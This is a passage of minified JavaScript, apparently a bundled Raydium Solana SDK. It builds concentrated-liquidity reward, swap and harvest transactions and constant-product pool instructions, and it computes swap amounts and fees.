              poolKeys: c,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: a },
              rewardInfo: {
                programId: new Ji(f.mint.programId),
                mint: new Ji(f.mint.address),
                openTime: f.openTime,
                endTime: f.endTime,
                emissionsPerSecondX64: UC.decimalToX64(f.perSecond),
              },
            });
          (d = SA(SA({}, d), h.address)), l.addInstruction(h);
        }
        return (
          l.addCustomComputeBudget(s),
          l.addTipInstruction(a),
          l.versionBuild({ txVersion: u, extInfo: { address: d } })
        );
      }
      async setReward({
        poolInfo: t,
        ownerInfo: e,
        rewardInfo: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        txVersion: a,
        feePayer: u,
      }) {
        n.endTime <= n.openTime &&
          this.logAndCreateError("reward time error", "rewardInfo", n);
        let c = this.createTxBuilder(u),
          l = e.useSOLBalance && n.mint.equals(GI),
          { account: d, instructionParams: f } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.programId,
              mint: n.mint,
              notUseTokenAccount: l,
              owner: this.scope.ownerPubKey,
              createInfo: l
                ? {
                    payer: e.feePayer || this.scope.ownerPubKey,
                    amount: new Yn(
                      new bI(
                        n.perSecond.mul(n.endTime - n.openTime).toFixed(0)
                      ).gte(n.perSecond.mul(n.endTime - n.openTime))
                        ? n.perSecond.mul(n.endTime - n.openTime).toFixed(0)
                        : n.perSecond
                            .mul(n.endTime - n.openTime)
                            .add(1)
                            .toFixed(0)
                    ),
                  }
                : void 0,
              associatedOnly: !l && r,
              checkCreateATAOwner: o,
            });
        f && c.addInstruction(f),
          d ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let h = await this.getClmmPoolKeys(t.id),
          p = cE.setRewardInstructions({
            poolInfo: t,
            poolKeys: h,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: d },
            rewardInfo: {
              mint: n.mint,
              openTime: n.openTime,
              endTime: n.endTime,
              emissionsPerSecondX64: UC.decimalToX64(n.perSecond),
            },
          });
        return (
          c.addInstruction(p),
          c.addCustomComputeBudget(i),
          c.addTipInstruction(s),
          c.versionBuild({ txVersion: a, extInfo: { address: p.address } })
        );
      }
      async setRewards({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfos: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        computeBudgetConfig: s,
        txTipConfig: a,
        txVersion: u,
        feePayer: c,
      }) {
        let l = this.createTxBuilder(c),
          d = {};
        for (let f of r) {
          f.endTime <= f.openTime &&
            this.logAndCreateError("reward time error", "rewardInfo", f);
          let r = n.useSOLBalance && f.mint.address === GI.toString(),
            { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Ji(f.mint.programId),
                mint: new Ji(f.mint.address),
                notUseTokenAccount: r,
                owner: this.scope.ownerPubKey,
                createInfo: r
                  ? {
                      payer: n.feePayer || this.scope.ownerPubKey,
                      amount: new Yn(
                        new bI(
                          f.perSecond.mul(f.endTime - f.openTime).toFixed(0)
                        ).gte(f.perSecond.mul(f.endTime - f.openTime))
                          ? f.perSecond.mul(f.endTime - f.openTime).toFixed(0)
                          : f.perSecond
                              .mul(f.endTime - f.openTime)
                              .add(1)
                              .toFixed(0)
                      ),
                    }
                  : void 0,
                associatedOnly: !r && o,
                checkCreateATAOwner: i,
              });
          a && l.addInstruction(a),
            s ||
              this.logAndCreateError(
                "no money",
                "ownerRewardAccount",
                this.scope.account.tokenAccountRawInfos
              );
          let u = null != e ? e : await this.getClmmPoolKeys(t.id),
            c = cE.setRewardInstructions({
              poolInfo: t,
              poolKeys: u,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: s },
              rewardInfo: {
                mint: new Ji(f.mint.address),
                openTime: f.openTime,
                endTime: f.endTime,
                emissionsPerSecondX64: UC.decimalToX64(f.perSecond),
              },
            });
          l.addInstruction(c), (d = SA(SA({}, d), c.address));
        }
        return (
          l.addCustomComputeBudget(s),
          l.addTipInstruction(a),
          l.versionBuild({ txVersion: u, extInfo: { address: d } })
        );
      }
      async collectReward({
        poolInfo: t,
        ownerInfo: e,
        rewardMint: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        txVersion: a,
        feePayer: u,
      }) {
        let c = t.rewardDefaultInfos.find(
          (t) => t.mint.address === n.toString()
        );
        c ||
          this.logAndCreateError(
            "reward mint error",
            "not found reward mint",
            n
          );
        let l = this.createTxBuilder(u),
          d = e.useSOLBalance && n.equals(GI),
          { account: f, instructionParams: h } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: new Ji(c.mint.programId),
              mint: n,
              notUseTokenAccount: d,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !d,
              createInfo: {
                payer: e.feePayer || this.scope.ownerPubKey,
                amount: 0,
              },
              associatedOnly: !d && r,
              checkCreateATAOwner: o,
            });
        h && l.addInstruction(h),
          f ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let p = await this.getClmmPoolKeys(t.id),
          m = cE.collectRewardInstructions({
            poolInfo: t,
            poolKeys: p,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: f },
            rewardMint: n,
          });
        return (
          l.addInstruction(m),
          l.addCustomComputeBudget(i),
          l.addTipInstruction(s),
          l.versionBuild({ txVersion: a, extInfo: { address: m.address } })
        );
      }
      async collectRewards({
        poolInfo: t,
        ownerInfo: e,
        rewardMints: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = {};
        for (let l of n) {
          let n = t.rewardDefaultInfos.find(
            (t) => t.mint.address === l.toString()
          );
          if (!n) {
            this.logAndCreateError(
              "reward mint error",
              "not found reward mint",
              l
            );
            continue;
          }
          let i = e.useSOLBalance && l.equals(GI),
            { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Ji(n.mint.programId),
                mint: l,
                notUseTokenAccount: i,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !i,
                createInfo: {
                  payer: e.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !i && r,
                checkCreateATAOwner: o,
              });
          s ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            ),
            a && u.addInstruction(a);
          let d = await this.getClmmPoolKeys(t.id),
            f = cE.collectRewardInstructions({
              poolInfo: t,
              poolKeys: d,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: s },
              rewardMint: l,
            });
          u.addInstruction(f), (c = SA(SA({}, c), f.address));
        }
        return (
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.build({ address: c })
        );
      }
      async swap({
        poolInfo: t,
        poolKeys: e,
        inputMint: n,
        amountIn: r,
        amountOutMin: o,
        priceLimit: i,
        observationId: s,
        ownerInfo: a,
        remainingAccounts: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        feePayer: p,
      }) {
        let m,
          g,
          y,
          w = this.createTxBuilder(p),
          b = n.toString() === t.mintA.address,
          v = a.useSOLBalance && t.mintA.address === GI.toBase58(),
          A = a.useSOLBalance && t.mintB.address === GI.toBase58();
        if (
          ((m =
            !i || i.equals(new bI(0))
              ? b
                ? tC.add(new Yn(1))
                : eC.sub(new Yn(1))
              : KC.priceToSqrtPriceX64(i, t.mintA.decimals, t.mintB.decimals)),
          !g)
        ) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Ji(t.mintA.address),
              notUseTokenAccount: v,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !v,
              createInfo:
                v || !b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? r : 0,
                    }
                  : void 0,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
          (g = e), n && w.addInstruction(n);
        }
        if (!y) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintB.programId,
              mint: new Ji(t.mintB.address),
              notUseTokenAccount: A,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !A,
              createInfo:
                A || b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? 0 : r,
                    }
                  : void 0,
              associatedOnly: !A && c,
              checkCreateATAOwner: l,
            });
          (y = e), n && w.addInstruction(n);
        }
        (!g || !y) &&
          this.logAndCreateError("user do not have token account", {
            tokenA: t.mintA.symbol || t.mintA.address,
            tokenB: t.mintB.symbol || t.mintB.address,
            ownerTokenAccountA: g,
            ownerTokenAccountB: y,
            mintAUseSOLBalance: v,
            mintBUseSOLBalance: A,
            associatedOnly: c,
          });
        let k = null != e ? e : await this.getClmmPoolKeys(t.id);
        return (
          w.addInstruction(
            cE.makeSwapBaseInInstructions({
              poolInfo: t,
              poolKeys: k,
              observationId: s,
              ownerInfo: {
                wallet: this.scope.ownerPubKey,
                tokenAccountA: g,
                tokenAccountB: y,
              },
              inputMint: new Ji(n),
              amountIn: r,
              amountOutMin: o,
              sqrtPriceLimitX64: m,
              remainingAccounts: u,
            })
          ),
          w.addCustomComputeBudget(f),
          w.addTipInstruction(h),
          w.versionBuild({ txVersion: d })
        );
      }
      async swapBaseOut({
        poolInfo: t,
        poolKeys: e,
        outputMint: n,
        amountOut: r,
        amountInMax: o,
        priceLimit: i,
        observationId: s,
        ownerInfo: a,
        remainingAccounts: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        feePayer: p,
      }) {
        let m,
          g,
          y,
          w = this.createTxBuilder(p),
          b = n.toString() === t.mintB.address,
          v = a.useSOLBalance && t.mintA.address === GI.toBase58(),
          A = a.useSOLBalance && t.mintB.address === GI.toBase58();
        if (
          ((m =
            !i || i.equals(new bI(0))
              ? n.toString() === t.mintB.address
                ? tC.add(new Yn(1))
                : eC.sub(new Yn(1))
              : KC.priceToSqrtPriceX64(i, t.mintA.decimals, t.mintB.decimals)),
          !g)
        ) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Ji(t.mintA.address),
              notUseTokenAccount: v,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !v,
              createInfo:
                v || !b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? o : 0,
                    }
                  : void 0,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
          (g = e), n && w.addInstruction(n);
        }
        if (!y) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintB.programId,
              mint: new Ji(t.mintB.address),
              notUseTokenAccount: A,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !A,
              createInfo:
                A || b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? 0 : o,
                    }
                  : void 0,
              associatedOnly: !A && c,
              checkCreateATAOwner: l,
            });
          (y = e), n && w.addInstruction(n);
        }
        (!g || !y) &&
          this.logAndCreateError("user do not have token account", {
            tokenA: t.mintA.symbol || t.mintA.address,
            tokenB: t.mintB.symbol || t.mintB.address,
            ownerTokenAccountA: g,
            ownerTokenAccountB: y,
            mintAUseSOLBalance: v,
            mintBUseSOLBalance: A,
            associatedOnly: c,
          });
        let k = null != e ? e : await this.getClmmPoolKeys(t.id);
        return (
          w.addInstruction(
            cE.makeSwapBaseOutInstructions({
              poolInfo: t,
              poolKeys: k,
              observationId: s,
              ownerInfo: {
                wallet: this.scope.ownerPubKey,
                tokenAccountA: g,
                tokenAccountB: y,
              },
              outputMint: new Ji(n),
              amountOut: r,
              amountInMax: o,
              sqrtPriceLimitX64: m,
              remainingAccounts: u,
            })
          ),
          w.addCustomComputeBudget(f),
          w.addTipInstruction(h),
          w.versionBuild({ txVersion: d })
        );
      }
      async harvestAllRewards({
        allPoolInfo: t,
        allPositions: e,
        lockInfo: n,
        ownerInfo: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        programId: s,
        txVersion: a,
        computeBudgetConfig: u,
        feePayer: c,
      }) {
        var l, d;
        let f = {};
        for (let y of this.scope.account.tokenAccountRawInfos)
          o
            ? y_(
                this.scope.ownerPubKey,
                y.accountInfo.mint,
                s
              ).publicKey.equals(y.pubkey) &&
              (f[y.accountInfo.mint.toString()] = y.pubkey)
            : (f[y.accountInfo.mint.toString()] = y.pubkey);
        let h = Object.values(e)
            .flat()
            .map((t) => t.nftMint),
          p = await MA(
            this.scope.connection,
            h.map((t) => ({ pubkey: t }))
          ),
          m = {};
        p.forEach((t) => {
          var e, n;
          m[t.pubkey.toBase58()] =
            null !=
            (n =
              null == (e = null == t ? void 0 : t.accountInfo)
                ? void 0
                : e.owner)
              ? n
              : null;
        });
        let g = this.createTxBuilder(c);
        for (let y of Object.values(t)) {
          if (
            void 0 === e[y.id] ||
            !e[y.id].find(
              (t) =>
                !t.liquidity.isZero() ||
                t.rewardInfos.find((t) => !t.rewardAmountOwed.isZero())
            )
          )
            continue;
          let t = y,
            s = r.useSOLBalance && t.mintA.address === GI.toString(),
            a = r.useSOLBalance && t.mintB.address === GI.toString(),
            u = f[t.mintA.address];
          if (!u) {
            let { account: e, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: t.mintA.programId,
                mint: new Ji(t.mintA.address),
                notUseTokenAccount: s,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !s,
                createInfo: {
                  payer: r.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !s && o,
                checkCreateATAOwner: i,
              });
            (u = e), n && g.addInstruction(n);
          }
          let c = f[t.mintB.address];
          if (!c) {
            let { account: e, instructionParams: n } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: t.mintB.programId,
                mint: new Ji(t.mintB.address),
                notUseTokenAccount: a,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !a,
                createInfo: {
                  payer: r.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !a && o,
                checkCreateATAOwner: i,
              });
            (c = e), n && g.addInstruction(n);
          }
          (f[t.mintA.address] = u), (f[t.mintB.address] = c);
          let h = [];
          for (let e of t.rewardDefaultInfos) {
            let t = r.useSOLBalance && e.mint.address === GI.toString(),
              n = f[e.mint.address];
            if (!n) {
              let { account: i, instructionParams: s } =
                await this.scope.account.getOrCreateTokenAccount({
                  tokenProgram: new Ji(e.mint.programId),
                  mint: new Ji(e.mint.address),
                  notUseTokenAccount: t,
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  createInfo: {
                    payer: r.feePayer || this.scope.ownerPubKey,
                    amount: 0,
                  },
                  associatedOnly: !t && o,
                });
              (n = i), s && g.addInstruction(s);
            }
            (f[e.mint.address] = n), h.push(n);
          }
          let p = await this.getClmmPoolKeys(t.id),
            w = [];
          for (let e = 0; e < p.rewardInfos.length; e++)
            w.push({
              poolRewardVault: new Ji(p.rewardInfos[e].vault),
              ownerRewardVault: h[e],
              rewardMint: new Ji(p.rewardInfos[e].mint.address),
            });
          for (let r of e[y.id]) {
            let e =
              null == (l = null == n ? void 0 : n[y.id])
                ? void 0
                : l[r.nftMint.toBase58()];
            if (e) {
              let t = y_(this.scope.ownerPubKey, e.lockNftMint, Bc).publicKey,
                n = HC.getTickArrayStartIndexByTick(
                  r.tickLower,
                  p.config.tickSpacing
                ),
                o = HC.getTickArrayStartIndexByTick(
                  r.tickUpper,
                  p.config.tickSpacing
                ),
                { publicKey: i } = AC(new Ji(p.programId), e.poolId, n),
                { publicKey: s } = AC(new Ji(p.programId), e.poolId, o),
                { publicKey: a } = kC(
                  new Ji(p.programId),
                  e.poolId,
                  r.tickLower,
                  r.tickUpper
                ),
                l = EC(B_, e.lockNftMint).publicKey,
                d = cE.harvestLockPositionInstructionV2({
                  programId: B_,
                  auth: C_,
                  lockPositionId: l,
                  clmmProgram: T_,
                  lockOwner: this.scope.ownerPubKey,
                  lockNftMint: e.lockNftMint,
                  lockNftAccount: t,
                  positionNftAccount: e.nftAccount,
                  positionId: e.positionId,
                  poolId: e.poolId,
                  protocolPosition: a,
                  vaultA: new Ji(p.vault.A),
                  vaultB: new Ji(p.vault.B),
                  tickArrayLower: i,
                  tickArrayUpper: s,
                  userVaultA: u,
                  userVaultB: c,
                  mintA: new Ji(p.mintA.address),
                  mintB: new Ji(p.mintB.address),
                  rewardAccounts: w,
                  exTickArrayBitmap: TC(T_, e.poolId).publicKey,
                });
              g.addInstruction({
                instructions: [d],
                instructionTypes: [OS],
                lookupTableAddress: p.lookupTableAccount
                  ? [p.lookupTableAccount]
                  : [],
              });
            } else {
              let e = cE.decreaseLiquidityInstructions({
                poolInfo: t,
                poolKeys: p,
                ownerPosition: r,
                ownerInfo: {
                  wallet: this.scope.ownerPubKey,
                  tokenAccountA: u,
                  tokenAccountB: c,
                  rewardAccounts: h,
                },
                liquidity: new Yn(0),
                amountMinA: new Yn(0),
                amountMinB: new Yn(0),
                nft2022:
                  null == (d = m[r.nftMint.toBase58()]) ? void 0 : d.equals(Cc),
              });
              g.addInstruction(e);
            }
          }
        }
        return 0 === a
          ? g.sizeCheckBuildV0({ computeBudgetConfig: u })
          : g.sizeCheckBuild({ computeBudgetConfig: u });
      }
      async getWhiteListMint({ programId: t }) {
        let e = await this.scope.connection.getAccountInfo(_C(t).publicKey);
        return e
          ? rE
              .decode(e.data)
              .whitelistMints.filter((t) => !t.equals(Ji.default))
          : [];
      }
      async getOwnerPositionInfo({ programId: t }) {
        await this.scope.account.fetchWalletTokenAccounts();
        let e = this.scope.account.tokenAccountRawInfos
            .filter((t) => t.accountInfo.amount.eq(new Yn(1)))
            .map((e) => IC(new Ji(t), e.accountInfo.mint).publicKey),
          n = await this.scope.connection.getMultipleAccountsInfo(e),
          r = [];
        return (
          n.forEach((t) => {
            if (!t) return;
            let e = tE.decode(t.data);
            r.push(e);
          }),
          r
        );
      }
      async getRpcClmmPoolInfo({ poolId: t }) {
        return (await this.getRpcClmmPoolInfos({ poolIds: [t] }))[String(t)];
      }
      async getRpcClmmPoolInfos({ poolIds: t, config: e }) {
        let n = await MA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Ji(t) })),
            e
          ),
          r = {};
        for (let o = 0; o < t.length; o++) {
          let e = n[o];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + String(t[o]));
          let i = QC.decode(e.accountInfo.data),
            s = KC.sqrtPriceX64ToPrice(
              i.sqrtPriceX64,
              i.mintDecimalsA,
              i.mintDecimalsB
            ).toNumber();
          r[String(t[o])] = _A(SA({}, i), {
            currentPrice: s,
            programId: e.accountInfo.owner,
          });
        }
        return r;
      }
      async getComputeClmmPoolInfos({ clmmPoolsRpcInfo: t, mintInfos: e }) {
        let n = new Set(Object.keys(t).map((e) => t[e].ammConfig.toBase58())),
          r = await MA(
            this.scope.connection,
            Array.from(n).map((t) => ({ pubkey: new Ji(t) }))
          ),
          o = {};
        r.forEach((t) => {
          !t.accountInfo ||
            (o[t.pubkey.toBase58()] = ZC.decode(t.accountInfo.data));
        });
        let i = await NC.fetchComputeMultipleClmmInfo({
          connection: this.scope.connection,
          rpcDataMap: t,
          poolList: Object.keys(t).map((n) => {
            var r, i, s, a;
            let [u, c] = [t[n].mintA.toBase58(), t[n].mintB.toBase58()];
            return {
              id: n,
              programId: t[n].programId.toBase58(),
              mintA: fE({
                address: u,
                decimals: t[n].mintDecimalsA,
                programId: e[u].programId.toBase58() || Bc.toBase58(),
                extensions: {
                  feeConfig:
                    null != (r = e[u]) && r.feeConfig
                      ? hE(null == (i = e[u]) ? void 0 : i.feeConfig)
                      : void 0,
                },
              }),
              mintB: fE({
                address: c,
                decimals: t[n].mintDecimalsB,
                programId: e[c].programId.toBase58() || Bc.toBase58(),
                extensions: {
                  feeConfig:
                    null != (s = e[c]) && s.feeConfig
                      ? hE(null == (a = e[c]) ? void 0 : a.feeConfig)
                      : void 0,
                },
              }),
              price: t[n].currentPrice,
              config: _A(SA({}, o[t[n].ammConfig.toBase58()]), {
                id: t[n].ammConfig.toBase58(),
                fundFeeRate: 0,
                description: "",
                defaultRange: 0,
                defaultRangePoint: [],
              }),
            };
          }),
        });
        return {
          computeClmmPoolInfo: i,
          computePoolTickData: await NC.fetchMultiplePoolTickArrays({
            connection: this.scope.connection,
            poolKeys: Object.values(i),
          }),
        };
      }
      async getPoolInfoFromRpc(t) {
        var e;
        let n = await this.getRpcClmmPoolInfo({ poolId: t }),
          r = new Set([n.mintA.toBase58(), n.mintB.toBase58()]),
          o = await DA({
            connection: this.scope.connection,
            mints: Array.from(r).map((t) => new Ji(t)),
          }),
          { computeClmmPoolInfo: i, computePoolTickData: s } =
            await this.scope.clmm.getComputeClmmPoolInfos({
              clmmPoolsRpcInfo: { [t]: n },
              mintInfos: o,
            }),
          a = await MA(this.scope.connection, [
            { pubkey: n.vaultA },
            { pubkey: n.vaultB },
          ]),
          u = (function (t) {
            return _A(SA({}, t), {
              type: "Concentrated",
              programId: t.programId.toString(),
              id: t.id.toString(),
              rewardDefaultInfos: [],
              rewardDefaultPoolInfos: "Clmm",
              price: t.currentPrice.toNumber(),
              mintAmountA: 0,
              mintAmountB: 0,
              feeRate: t.ammConfig.tradeFeeRate,
              openTime: t.startTime.toString(),
              tvl: 0,
              day: DC,
              week: DC,
              month: DC,
              pooltype: [],
              farmUpcomingCount: 0,
              farmOngoingCount: 0,
              farmFinishedCount: 0,
              burnPercent: 0,
              config: _A(SA({}, t.ammConfig), {
                id: t.ammConfig.id.toString(),
                defaultRange: 0,
                defaultRangePoint: [],
              }),
            });
          })(i[t]);
        if (!a[0].accountInfo || !a[1].accountInfo)
          throw new Error("pool vault data not found");
        return (
          (u.mintAmountA = Number(
            $c.decode(a[0].accountInfo.data).amount.toString()
          )),
          (u.mintAmountB = Number(
            $c
              .decode(null == (e = a[1].accountInfo) ? void 0 : e.data)
              .amount.toString()
          )),
          {
            poolInfo: u,
            poolKeys: _A(SA({}, i[t]), {
              exBitmapAccount: i[t].exBitmapAccount.toBase58(),
              observationId: i[t].observationId.toBase58(),
              id: t,
              programId: n.programId.toBase58(),
              openTime: n.startTime.toString(),
              vault: { A: n.vaultA.toBase58(), B: n.vaultB.toBase58() },
              config: u.config,
              rewardInfos: i[t].rewardInfos
                .filter((t) => !t.tokenVault.equals(Ji.default))
                .map((t) => ({
                  mint: fE({
                    address: t.tokenMint.toBase58(),
                    programId: Bc.toBase58(),
                    decimals: 10,
                  }),
                  vault: t.tokenVault.toBase58(),
                })),
            }),
            computePoolInfo: i[t],
            tickData: s,
          }
        );
      }
    };
  function $E(t, e) {
    if (e.isZero()) throw Error("divisor is zero");
    return t.mod(e);
  }
  var tx = new Yn(0),
    ex = class {
      static swapWithoutFees(t, e, n) {
        let r = e.mul(n),
          o = e.add(t),
          [i] = (function (t, e) {
            if (e.isZero()) throw Error("rhs is zero");
            let n = t.div(e);
            if (n.isZero()) throw Error("quotient is zero");
            let r = $E(t, e);
            return (
              r.gt(tx) &&
                ((n = n.add(new Yn(1))),
                (e = t.div(n)),
                (r = $E(t, n)),
                r.gt(tx) && (e = e.add(new Yn(1)))),
              [n, e]
            );
          })(r, o),
          s = n.sub(i);
        if (s.isZero()) throw Error("destinationAmountSwapped is zero");
        return { destinationAmountSwapped: s };
      }
      static lpTokensToTradingTokens(t, e, n, r, o) {
        let i = t.mul(n).div(e),
          s = t.mul(r).div(e);
        if (0 === o) return { tokenAmount0: i, tokenAmount1: s };
        if (1 === o)
          return (
            $E(t.mul(n), e).gt(tx) && i.gt(tx) && (i = i.add(new Yn(1))),
            $E(t.mul(r), e).gt(tx) && s.gt(tx) && (s = s.add(new Yn(1))),
            { tokenAmount0: i, tokenAmount1: s }
          );
        throw Error("roundDirection value error");
      }
    },
    nx = class {
      static tradingFee(t, e) {
        return aS(t, e, J_);
      }
      static protocolFee(t, e) {
        return uS(t, e, J_);
      }
      static fundFee(t, e) {
        return uS(t, e, J_);
      }
    },
    rx = ((t) => (
      (t[(t.Floor = 0)] = "Floor"), (t[(t.Ceiling = 1)] = "Ceiling"), t
    ))(rx || {}),
    ox = class {
      static validate_supply(t, e) {
        if (t.isZero()) throw Error("tokenAmount0 is zero");
        if (e.isZero()) throw Error("tokenAmount1 is zero");
      }
      static swap(t, e, n, r) {
        let o = nx.tradingFee(t, r),
          i = t.sub(o),
          { destinationAmountSwapped: s } = ex.swapWithoutFees(i, e, n);
        return {
          newSwapDestinationAmount: n.sub(s),
          sourceAmountSwapped: t,
          destinationAmountSwapped: s,
          tradeFee: o,
        };
      }
      static swapBaseOut({
        poolMintA: t,
        poolMintB: e,
        tradeFeeRate: n,
        baseReserve: r,
        quoteReserve: o,
        outputMint: i,
        outputAmount: s,
      }) {
        let [a, u, c, l, d] =
            e.address === i.toString()
              ? [r, o, t.decimals, e.decimals, t.address]
              : [o, r, e.decimals, t.decimals, e.address],
          f = new mA(u.toString())
            .div(10 ** l)
            .div(new mA(a.toString()).div(10 ** c)),
          h = s.gte(u) ? u.sub(new Yn(1)) : s,
          p = u.sub(h),
          m = F_(a.mul(h), p),
          g = F_(m.mul(new Yn(1e6)), new Yn(1e6).sub(n)),
          y = g.sub(m),
          w = new mA(h.toString())
            .div(10 ** l)
            .div(new mA(g.toString()).div(10 ** c));
        return {
          amountRealOut: h,
          amountIn: g,
          amountInWithoutFee: m,
          tradeFee: y,
          priceImpact: f.isZero() ? 0 : w.sub(f).div(f).abs().toNumber(),
        };
      }
    },
    ix = dt.from("vault_and_lp_mint_auth_seed", "utf8");
  dt.from("amm_config", "utf8");
  var sx = dt.from("pool", "utf8"),
    ax = dt.from("pool_lp_mint", "utf8"),
    ux = dt.from("pool_vault", "utf8"),
    cx = dt.from("observation", "utf8");
  function lx(t) {
    return f_([ix], t);
  }
  function dx(t, e, n, r) {
    return f_([sx, e.toBuffer(), n.toBuffer(), r.toBuffer()], t);
  }
  function fx(t, e, n) {
    return f_([ux, e.toBuffer(), n.toBuffer()], t);
  }
  function hx(t, e) {
    return f_([cx, e.toBuffer()], t);
  }
  function px({ poolId: t, programId: e, configId: n, mintA: r, mintB: o }) {
    let i = lx(e).publicKey,
      s = t || dx(e, n, r, o).publicKey,
      a = (function (t, e) {
        return f_([ax, e.toBuffer()], t);
      })(e, s).publicKey;
    return {
      poolId: s,
      configId: n,
      authority: i,
      lpMint: a,
      vaultA: fx(e, s, r).publicKey,
      vaultB: fx(e, s, o).publicKey,
      observationId: hx(e, s).publicKey,
    };
  }
  var mx = dt.from("locked_liquidity", "utf8");
  function gx(t, e) {
    return f_([mx, e.toBuffer()], t);
  }
  var yx = PA("Raydium_cpmm"),
    wx = {
      initialize: [175, 175, 109, 31, 13, 152, 155, 237],
      deposit: [242, 35, 198, 137, 82, 225, 242, 182],
      withdraw: [183, 18, 70, 156, 148, 109, 161, 34],
      swapBaseInput: [143, 190, 90, 218, 196, 30, 51, 222],
      swapBaseOutput: [55, 217, 98, 86, 163, 74, 180, 173],
      lockCpLiquidity: [216, 157, 29, 78, 38, 51, 31, 26],
      collectCpFee: [8, 30, 51, 199, 209, 184, 247, 133],
    };
  function bx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y, w, b) {
    let v = JT([zT("amountMaxA"), zT("amountMaxB"), zT("openTime")]),
      A = dx(t, n, i, s).publicKey,
      k = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !o.equals(A), isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !1 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: c, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: d, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !0 },
        { pubkey: h, isSigner: !1, isWritable: !0 },
        { pubkey: g, isSigner: !1, isWritable: !0 },
        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: p, isSigner: !1, isWritable: !1 },
        { pubkey: m, isSigner: !1, isWritable: !1 },
        { pubkey: Ec, isSigner: !1, isWritable: !1 },
        { pubkey: jI, isSigner: !1, isWritable: !1 },
        { pubkey: KI, isSigner: !1, isWritable: !1 },
      ],
      I = dt.alloc(v.span);
    return (
      v.encode({ amountMaxA: y, amountMaxB: w, openTime: b }, I),
      new vs({ keys: k, programId: t, data: dt.from([...wx.initialize, ...I]) })
    );
  }
  function vx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    let m = JT([zT("lpAmount"), zT("amountMaxA"), zT("amountMaxB")]),
      g = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
